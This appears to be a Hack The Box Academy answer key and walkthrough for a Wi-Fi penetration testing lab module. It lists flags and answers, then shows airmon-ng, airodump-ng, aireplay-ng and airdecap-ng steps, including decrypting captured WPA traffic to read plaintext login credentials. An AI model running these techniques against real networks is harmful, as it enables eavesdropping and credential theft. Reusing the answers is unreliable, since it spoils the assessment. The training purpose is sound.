
| Section                                              | Question Number | Answer                                 |
| ---------------------------------------------------- | --------------- | -------------------------------------- |
| Wi-Fi Interfaces                                     | Question 1      | 2                                      |
| Wi-Fi Interfaces                                     | Question 2      | HackTheBox-5G                          |
| Interface Modes                                      | Question 1      | 5                                      |
| Airmon-ng                                            | Question 1      | 4                                      |
| Airmon-ng                                            | Question 2      | htb80211\_chipset                      |
| Airodump-ng                                          | Question 1      | 11                                     |
| Airodump-ng                                          | Question 2      | HackTheBox-5G                          |
| Airodump-ng                                          | Question 3      | CyberNet-Secure                        |
| Airgraph-ng                                          | Question 1      | 9                                      |
| Airgraph-ng                                          | Question 2      | 6                                      |
| Airgraph-ng                                          | Question 3      | 2                                      |
| Aireplay-ng                                          | Question 1      | 2                                      |
| Aireplay-ng                                          | Question 2      | 4                                      |
| Airdecap-ng                                          | Question 1      | htb-admin                              |
| Airdecap-ng                                          | Question 2      | HTB\_@cademy\_ROCKS                    |
| Aircrack-ng                                          | Question 1      | AE:5B:7F:3A:03:D0:AF:9B:F6:8D:A5:E2:C7 |
| Aircrack-ng                                          | Question 2      | Induction                              |
| Connecting to Wi-Fi Networks                         | Question 1      | HTB{C0NN3cTeD\_t0\_WPA}                |
| Connecting to Wi-Fi Networks                         | Question 2      | HTB{W3p\_!s\_EasY}                     |
| Connecting to Wi-Fi Networks                         | Question 3      | HTB{ENT3RPR!SE\_C00n3ctED              |
| Finding Hidden SSIDs                                 | Question 1      | CyberNet-Secure                        |
| Finding Hidden SSIDs                                 | Question 2      | HTB                                    |
| Finding Hidden SSIDs                                 | Question 3      | FreeWifi                               |
| Bypassing Mac Filtering                              | Question 1      | CyberNet-Secure-5G                     |
| Bypassing Mac Filtering                              | Question 2      | HTB{bfcc811c7b9b4c7cf63c5c2e968e13e0}  |
| Wi-Fi Penetration Testing Basics - Skills Assessment | Question 1      | HTB                                    |
| Wi-Fi Penetration Testing Basics - Skills Assessment | Question 2      | minecraft                              |
| Wi-Fi Penetration Testing Basics - Skills Assessment | Question 3      | HTB{H@ck3R\_M@n}                       |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Wi-Fi Interfaces

## Question 1

### "Check the driver capabilities for the interface. How many software interface modes are available? (Answer in digit format: e.g., 3)"

Students will establish an RDP connection to the target using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.138]─[htb-ac-8414@htb-brjqxbugl5]─[~]
└──╼ [★]$ xfreerdp /v:10.129.205.188 /u:wifi /p:wifi /dynamic-resolution 

[01:19:28:300] [11262:11263] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[01:19:28:601] [11262:11263] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[01:19:28:601] [11262:11263] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[01:19:28:616] [11262:11263] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[01:19:28:616] [11262:11263] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[01:19:28:616] [11262:11263] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and will use the `iw list` command to get information about the driver capabilities for the interface and will grep for `software` and the available interface modes:

Code: shell

```shell
iw list | grep -i software -A2
```

```
wifi@WiFiIntro:~$ iw list | grep -i software -A2

	software interface modes (can always be added):
		 * AP/VLAN
		 * monitor
```

Answer: `2`

# Wi-Fi Interfaces

## Question 2

### "Follow the steps shown in the section to scan for available WiFi networks. What is the ESSID name of the 3rd WiFi Network (Cell 03)?"

Students will reuse the previously established RDP session. Subsequently, they will scan for available Wi-Fi networks using the `iwlist` utility with the `scan`/`scanning` command and the `wlan0` interface to obtain the network on `Cell 03`:

Code: shell

```shell
iwlist wlan0 scanning | grep 'Cell\|Quality\|ESSID\|IEEE'
```

```
wifi@WiFiIntro:~$ iwlist wlan0 scanning |  grep 'Cell\|Quality\|ESSID\|IEEE'

          Cell 01 - Address: D8:D6:3D:EB:29:D5
                    Quality=61/70  Signal level=-49 dBm  
                    ESSID:"CyberNet-Secure"
                    IE: IEEE 802.11i/WPA2 Version 1
          Cell 02 - Address: D8:D6:3A:EB:29:D4
                    Quality=70/70  Signal level=-30 dBm  
                    ESSID:"HackTheBox"
                    IE: IEEE 802.11i/WPA2 Version 1
          Cell 03 - Address: D8:D6:3A:EB:29:D4
                    Quality=70/70  Signal level=-30 dBm  
                    ESSID:"{hidden}"
                    IE: IEEE 802.11i/WPA2 Version 
```

Answer: `HackTheBox-5G`

# Interface Modes

## Question 1

### "How many interface modes are available? (Answer in digit format: e.g., 3)"

Students will establish an RDP connection to the target using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.138]─[htb-ac-8414@htb-fixk75gzy4]─[~]
└──╼ [★]$ xfreerdp /v:10.129.13.145 /u:wifi /p:wifi /dynamic-resolution 

[02:51:13:613] [45520:45521] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[02:51:13:914] [45520:45521] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[02:51:13:914] [45520:45521] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[02:51:13:931] [45520:45521] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[02:51:13:931] [45520:45521] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[02:51:13:931] [45520:45521] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and will enumerate the current mode of the `wlan0` adapter using `iwconfig`. They will come to know the adapter is running in `Managed` mode:

Code: shell

```shell
sudo iwconfig wlan0
```

```
wifi@WiFiIntro:~$ sudo iwconfig wlan0

wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
```

Subsequently, stop the adapter, change the mode to `ad-hoc`, and again use the `iwconfig` command to get information on whether the mode change was successful. They will come to know that the adapter is successfully running in `Ad-Hoc` mode:

Code: shell

```shell
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode ad-hoc
sudo iwconfig wlan0
```

```
wifi@WiFiIntro:~$ sudo ifconfig wlan0 down
wifi@WiFiIntro:~$ sudo iwconfig wlan0 mode ad-hoc
wifi@WiFiIntro:~$ sudo iwconfig wlan0

wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Ad-Hoc  Cell: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
```

Next, students will create a `.conf` file with details about the interface:

Code: shell

```shell
cat << EOF > open.conf
interface=wlan0
driver=nl80211
ssid=HTB-Academy-Student
channel=2
hw_mode=g
EOF
```

```
wifi@WiFiIntro:~$ cat << EOF > open.conf
interface=wlan0
driver=nl80211
ssid=HTB-Academy-Student
channel=2
hw_mode=g
EOF
```

Subsequently, students will use `hostapd` with the configuration file to bring up and open a network with the name `HTB-Academy-Student`:

Code: shell

```shell
sudo hostapd open.conf
```

```
wifi@WiFiIntro:~$ sudo hostapd open.conf 

rfkill: Cannot open RFKILL control device
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED
```

Students will open a new terminal tab/window and will come to know that the adapter is successfully running in `Master` mode:

Code: shell

```shell
sudo iwconfig wlan0
```

```
wifi@WiFiIntro:~$ sudo iwconfig wlan0

wlan0     IEEE 802.11  Mode:Master  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

They will terminate the process using the key combination `CTRL + C`, stop the adapter, and change the mode to `mesh`. Students will find that the adapter is successfully running in `Auto` (`Mesh`) mode:

Code: shell

```shell
sudo ifconfig wlan0 down
sudo iw dev wlan0 set type mesh
sudo iwconfig wlan0
```

```
wifi@WiFiIntro:~$ sudo iwconfig wlan0

wlan0     IEEE 802.11  Mode:Auto  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

Next, students will stop the adapter and change the mode to `monitor`. Students will find that the adapter is successfully running in `Monitor` mode:

Code: shell

```shell
sudo ifconfig wlan0 down
sudo iw wlan0 set monitor control
sudo ifconfig wlan0 up
sudo iwconfig wlan0
```

```
wifi@WiFiIntro:~$ sudo ifconfig wlan0 down
wifi@WiFiIntro:~$ sudo iw wlan0 set monitor control
wifi@WiFiIntro:~$ sudo ifconfig wlan0 up
wifi@WiFiIntro:~$ sudo iwconfig wlan0

wlan0     IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

Students will understand that the adapter is running in every mode mentioned in the section. Subsequently, they will count the number of modes.

Answer: `5`

# Airmon-ng

## Question 1

### "Activate monitor mode using airmon-ng. How many potentially problematic processes are detected? (Please provide your answer in digit format, e.g., 3)"

Students will establish an RDP connection to the target using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.138]─[htb-ac-8414@htb-fab7aksdzy]─[~]
└──╼ [★]$ xfreerdp /v:10.129.205.188 /u:wifi /p:wifi /dynamic-resolution 

[03:34:16:851] [14364:14365] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[03:34:17:152] [14364:14365] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[03:34:17:152] [14364:14365] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[03:34:17:173] [14364:14365] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[03:34:17:173] [14364:14365] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[03:34:17:174] [14364:14365] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Subsequently, students will open a terminal and use airmon's `check` functionality to look for interfering processes:

Code: shell

```shell
sudo airmong-ng check wlan0
```

```
wifi@WiFiIntro:~$ sudo airmon-ng check wlan0

Found {hidden} processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

<SNIP>
```

Answer: `4`

# Airmon-ng

## Question 2

### "Activate monitor mode using airmon-ng. What is the name of the wireless driver being utilized?"

Students will reuse the previously established RDP session. Subsequently, students will use `airmon-ng` to terminate the interfering processes:

Code: shell

```shell
sudo airmon-ng check kill
```

```
wifi@WiFiIntro:~$ sudo airmon-ng check kill

Killing these processes:

    PID Name
    203 wpa_supplicant
```

Students will start `airmon-ng` using the `wlan0` adapter, specifying `11` as the channel, and will obtain information about the driver in the output:

Code: shell

```shell
sudo airmon-ng start wlan0 11
```

```
wifi@WiFiIntro:~$ sudo airmon-ng start wlan0 11

PHY	Interface	Driver		Chipset

phy5	wlan0		{hidden}	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy5]wlan0 on [phy5]wlan0mon)
		(mac80211 station mode vif disabled for [phy5]wlan0)
```

Answer: `htb80211_chipset`

# Airodump-ng

## Question 1

### "What channel is the WiFi network "HackTheBox" operating on?"

Students will establish an RDP connection to the target using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.138]─[htb-ac-8414@htb-guxtd1qvmr]─[~]
└──╼ [★]$ xfreerdp /v:10.129.205.188 /u:wifi /p:wifi /dynamic-resolution 

[05:48:37:115] [47103:47104] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[05:48:37:416] [47103:47104] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[05:48:37:416] [47103:47104] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[05:48:37:437] [47103:47104] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[05:48:37:437] [47103:47104] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[05:48:37:437] [47103:47104] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Subsequently, students will open a terminal and will use `airmon-ng` to start monitor mode on the `wlan0` adapter, and they will enumerate the adapters and modes using `iwconfig`:

Code: shell

```shell
sudo airmon-ng start wlan0
iwconfig
```

```
wifi@WiFiIntro:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    183 avahi-daemon
    203 wpa_supplicant
    206 avahi-daemon
    218 NetworkManager

PHY	Interface	Driver		Chipset

phy5	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy5]wlan0 on [phy5]wlan0mon)
		(mac80211 station mode vif disabled for [phy5]wlan0)
		
wifi@WiFiIntro:~$ iwconfig

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

Next, students will use `airodump-ng` and specify the name of the interface (`wlan0mon`) to scan and collect data about the wireless networks in the environment, finding the channel number used by the `HackTheBox` ESSID in the `CH` column in the output:

Code: shell

```shell
sudo airodump-ng wlan0mon
```

```
wifi@WiFiIntro:~$ sudo airodump-ng wlan0mon

 CH  5 ][ Elapsed: 24 s ][ 2024-10-14 10:50 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3A:EB:29:D4  -28       13        0    0  {hidden}   54   WPA2 CCMP   PSK  HackTheBox                                                     
 D8:D6:3D:EB:29:D5  -47       14        2    0   1   54   WPA2 CCMP   PSK  CyberNet-Secure                                                

<SNIP>
```

Answer: `11`

# Airodump-ng

## Question 2

### "What is the ESSID of the WiFi network operating on the 5 GHz band?"

Students will reuse the previously established RDP session. Subsequently, they will use `airodump-ng`, and the `wlan0mon` adapter, while specifying `a` in the `--band` option to scan on the 5GHz band, obtaining the ESSID running on it:

Code: shell

```shell
sudo airodump-ng wlan0mon --band a
```

```
wifi@WiFiIntro:~$ sudo airodump-ng wlan0mon --band a

 CH 151 ][ Elapsed: 1 min ][ 2024-10-14 10:57 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3A:EB:29:D4  -28       39        0    0  48   54   WPA2 CCMP   PSK  {hidden}                                                  

<SNIP>
```

Answer: `HackTheBox-5G`

# Airodump-ng

## Question 3

### "What is the ESSID of the WiFi network to which all the clients are currently connected?"

Students will reuse the previously established RDP session. Subsequently, they will use `airodump-ng` and the `wlan0mon` adapter to scan the 2.4GHz and 5GHz bands and obtain information related to the connections from clients to the most used Wi-Fi network:

Code: shell

```shell
sudo airodump-ng wlan0mon --band abg
```

```
wifi@WiFiIntro:~$ sudo airodump-ng wlan0mon --band abg

 CH 62 ][ Elapsed: 4 mins ][ 2024-10-14 11:04 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3A:EB:29:D4  -28      120        0    0  48   54   WPA2 CCMP   PSK  HackTheBox-5G                                                  
 D8:D6:3D:EB:29:D5  -47       38       22    0   1   54   WPA2 CCMP   PSK  {hidden}                                                

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   82:05:89:03:24:0F  -29    0 - 1      0       11                                                                        
 D8:D6:3D:EB:29:D5  7E:AA:D3:C7:16:64  -29    0 - 1      0        8                                                                        
 D8:D6:3D:EB:29:D5  FA:E0:E5:1F:CB:56  -29    0 - 6     54       17                                                       
 D8:D6:3D:EB:29:D5  AE:33:4B:B8:75:62  -29    0 - 1      0       27         
```

Students will scrutinize the output and notice that the BSSID `D8:D6:3D:EB:29:D5` is the most occupied.

Answer: `CyberNet-Secure`

# Airgraph-ng

## Question 1

### "Use airgraph-ng on the file /opt/data.csv to create a graph of Clients to AP Relationship (CAPR). How many total clients are shown in the generated graphic? (Answer in digit format: e.g., 3)"

Students will establish an RDP connection to the target using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.138]─[htb-ac-8414@htb-guxtd1qvmr]─[~]
└──╼ [★]$ xfreerdp /v:10.129.175.11 /u:wifi /p:wifi /dynamic-resolution

[06:29:52:476] [110938:110939] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[06:29:53:777] [110938:110939] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[06:29:53:777] [110938:110939] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[06:29:53:799] [110938:110939] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[06:29:53:799] [110938:110939] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[06:29:53:799] [110938:110939] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal, use `airgraph-ng`, open the generated PNG file, and count the number of the clients pointing to an access point.

Code: shell

```shell
sudo airgraph-ng -i /opt/data.csv -g CAPR -o ~/Desktop/Students_CAPR.png
ristretto ~/Desktop/Students_CAPR.png 
```

```
wifi@WiFiIntro:~$ sudo airgraph-ng -i /opt/data.csv -g CAPR -o ~/Desktop/Students_CAPR.png

/usr/local/bin/airgraph-ng:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('airgraph-ng==1.1', 'airgraph-ng')

**** WARNING Images can be large, up to 12 Feet by 12 Feet****
Creating your Graph using, /opt/data.csv and writing to, /home/wifi/Desktop/Students_CAPR.png
Depending on your system this can take a bit. Please standby......

wifi@WiFiIntro:~$ ristretto ~/Desktop/Students_CAPR.png 
```

Answer: `9`

# Airgraph-ng

## Question 2

### "Use airgraph-ng on the file /opt/data.csv to create a graph of Clients to AP Relationship (CAPR). How many clients are connected to the AP 'CyberNet-Secure'? (Answer in digit format: e.g., 3)"

Students will reuse the previously established RDP session. Subsequently, students will open the previously generated PNG image (`Students_CAPR.png`) and count the number of clients connected to the `CyberNet-Secure` access point.

Answer: `6`

# Airgraph-ng

## Question 3

### "Use airgraph-ng on the file /opt/data.csv to create a Common Probe graph (CPG). How many clients are probing for the AP 'HTB-Wireless'? (Answer in digit format: e.g., 3)"

Students will reuse the previously established RDP session. Subsequently, students will use `airgraph-ng` to generate a CPG graph and will scrutinize the clients connected to the `HTB-Wireless` network:

Code: shell

```shell
sudo airgraph-ng -i /opt/data.csv -g CPG -o ~/Desktop/Students_CPG.png
ristretto ~/Desktop/Students_CPG.png
```

```
wifi@WiFiIntro:~$ sudo airgraph-ng -i /opt/data.csv -g CPG -o ~/Desktop/Students_CPG.png

/usr/local/bin/airgraph-ng:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('airgraph-ng==1.1', 'airgraph-ng')

**** WARNING Images can be large, up to 12 Feet by 12 Feet****
Creating your Graph using, /opt/data.csv and writing to, /home/wifi/Desktop/Students_CPG.png
Depending on your system this can take a bit. Please standby......

wifi@WiFiIntro:~$ ristretto ~/Desktop/Students_CPG.png
```

Answer: `2`

# Aireplay-ng

## Question 1

### "Set the channel to 11 and test for packet injection using aireplay-ng. On how many APs does it perform packet injection? (Answer in digit format: e.g., 3)"

Students will establish an RDP connection to the target using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.138]─[htb-ac-8414@htb-33p9cpayun]─[~]
└──╼ [★]$ xfreerdp /v:10.129.14.217 /u:wifi /p:wifi /dynamic-resolution 

[06:57:52:118] [8273:8289] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[06:57:52:419] [8273:8289] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[06:57:52:419] [8273:8289] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[06:57:52:440] [8273:8289] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[06:57:52:441] [8273:8289] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[06:57:52:441] [8273:8289] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Subsequently, students will open a terminal and use `airmon-ng` to start the `wlan0` interface on channel 11:

Code: shell

```shell
sudo airmon-ng start wlan0 1
```

```
wifi@WiFiIntro:~$ sudo airmon-ng start wlan0 1

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    183 avahi-daemon
    203 wpa_supplicant
    224 NetworkManager
    225 avahi-daemon

<SNIP>
```

Next, students will use `iw` to alter the channel from 1 to 11 on the `wlan0mon` interface:

Code: shell

```shell
sudo iw dev wlan0mon set channel 11
```

```
wifi@WiFiIntro:~$ sudo iw dev wlan0mon set channel 11
```

Students will run the packet injection test using `aireplay-ng` on the `wlan0mon` interface to find out the number of found access points:

Code: shell

```shell
sudo aireplay-ng --test wlan0mon
```

```
wifi@WiFiIntro:~$ sudo aireplay-ng --test wlan0mon

11:09:35  Trying broadcast probe requests...
11:09:35  Injection is working!
11:09:37  Found {hidden} APs

<SNIP>
```

Answer: `2`

# Aireplay-ng

## Question 2

### "How many clients are connected to 'CyberNet-Secure'? (Answer in digit format: e.g., 3)"

Students will reuse the previously established RDP session. Subsequently, students will use `airodump-ng` and will scrutinize the number of clients in the `STATION` column connected to the `CyberNet-Secure` with BSSID of `D8:D6:3D:EB:29:D5`:

Code: shell

```shell
sudo airodump-ng wlan0mon
```

```
wifi@WiFiIntro:~$ sudo airodump-ng wlan0mon

 CH 11 ][ Elapsed: 42 s ][ 2024-10-16 05:49 ][ WPA handshake: D8:D6:3D:EB:29:D5 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3A:EB:29:D4  -28      407        0    0  11   54   WPA2 CCMP   PSK  HackTheBox                     
 D8:D6:3D:EB:29:D5  -47       29        8    0   1   54   WPA2 CCMP   PSK  CyberNet-Secure                

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 D8:D6:3D:EB:29:D5  5E:97:74:C0:B9:3D  -29    0 - 1     25       12         CyberNet-Secure                
 D8:D6:3D:EB:29:D5  C6:46:E6:91:6F:0D  -29    1 - 1      0       10  EAPOL  CyberNet-Secure
<SNIP>
```

Answer: `4`

# Airdecap-ng

## Question 1

### "Decrypt the file located at /opt/decrypt.cap using airdecap-ng. Look for sensitive data indicating a user is attempting to log in to a website with a POST request. What is the username associated with this login attempt? (The WPA key for ESSID named CyberNet-Secure is Password123!!!!!!)"

Students will establish an RDP connection to the target using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-fc43a8rt5o]─[~]
└──╼ [★]$ xfreerdp /v:10.129.59.57 /u:wifi /p:wifi /dynamic-resolution 

[01:20:32:513] [5463:5464] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[01:20:32:813] [5463:5464] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[01:20:32:814] [5463:5464] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[01:20:32:826] [5463:5464] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[01:20:32:826] [5463:5464] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[01:20:32:826] [5463:5464] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Subsequently, students will open a terminal and use `airdecap-ng` to decrypt the `decrypt.cap` packet capture using the passphrase `Password123!!!!!!`, and the access point name of `CyberNet-Secure`:

Code: shell

```shell
sudo airdecap-ng -p 'Password123!!!!!!' /opt/decrypt.cap -e CyberNet-Secure
```

```
wifi@WiFiIntro:~$ sudo airdecap-ng -p 'Password123!!!!!!' /opt/decrypt.cap -e CyberNet-Secure

Total number of stations seen            5
Total number of packets read          2691
Total number of WEP data packets         0
Total number of WPA data packets        84
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets        61
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0
```

Students will use `tcpdump` to read the data from the decrypted packet capture, scrutinizing traffic related to port `80` due to the protocol's nature of sending data without encrypting it, stumbling across a `POST` request containing credentials (username) in plaintext in the `user` and `pass` parameters.

Code: shell

```shell
sudo tcpdump -r /opt/decrypt-dec.cap -A 'tcp port 80 or tcp port 443' | grep 'POST' -A14
```

```
wifi@WiFiIntro:~$ sudo tcpdump -r /opt/decrypt-dec.cap -A 'tcp port 80 or tcp port 443' -s 0 | grep 'POST' -A14

reading from file /opt/decrypt-dec.cap, link-type EN10MB (Ethernet), snapshot length 65535
10:46:46.234319 IP 192.168.1.84.53380 > 192.168.1.1.http: Flags [P.], seq 1:610, ack 1, win 502, options [nop,nop,TS val 1117384946 ecr 2274832184], length 609: HTTP: POST / HTTP/1.1
E....3@.@......T.......P..s.T.}.....$......
B...../8POST / HTTP/1.1
Host: 192.168.1.1
Connection: keep-alive
Content-Length: 39
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

user={hidden}&pass={hidden}
```

Answer: `htb-admin`

# Airdecap-ng

## Question 2

### "Decrypt the file located at /opt/decrypt.cap using airdecap-ng. Look for sensitive data indicating a user is attempting to log in to a website with a POST request. What is the password entered during this login attempt? (The WPA key for ESSID named CyberNet-Secure is Password123!!!!!!)"

Students will reuse the previously established RDP session and decrypted traffic. They will utilize the same command to obtain the credentials (password) in plaintext using `tcpdump`:

Code: shell

```shell
sudo tcpdump -r /opt/decrypt-dec.cap -A 'tcp port 80 or tcp port 443' | grep 'POST' -A14
```

```
wifi@WiFiIntro:~$ sudo tcpdump -r /opt/decrypt-dec.cap -A 'tcp port 80 or tcp port 443' -s 0 | grep 'POST' -A14

reading from file /opt/decrypt-dec.cap, link-type EN10MB (Ethernet), snapshot length 65535
10:46:46.234319 IP 192.168.1.84.53380 > 192.168.1.1.http: Flags [P.], seq 1:610, ack 1, win 502, options [nop,nop,TS val 1117384946 ecr 2274832184], length 609: HTTP: POST / HTTP/1.1
E....3@.@......T.......P..s.T.}.....$......
B...../8POST / HTTP/1.1
Host: 192.168.1.1
Connection: keep-alive
Content-Length: 39
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

user={hidden}&pass={hidden}
```

Students will take into account the URL encoding present in the password and decode `%40` to the `@` character and will decode it using `sed` and `xargs`:

Code: shell

```shell
echo '%40' | sed 's/%/\\x/g' | xargs -0 printf
```

```
wifi@WiFiIntro:~$ echo '%40' | sed 's/%/\\x/g' | xargs -0 printf

@
```

Answer: `HTB_@cademy_ROCKS`

# Aircrack-ng

## Question 1

### "Utilize Aircrack-ng to crack the WEP key from the file located at "/opt/WEP.ivs" and submit the found key as the answer."

Students will establish an RDP connection to the target using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-ezclizubkv]─[~]
└──╼ [★]$ xfreerdp /v:10.129.205.188 /u:wifi /p:wifi /dynamic-resolution 

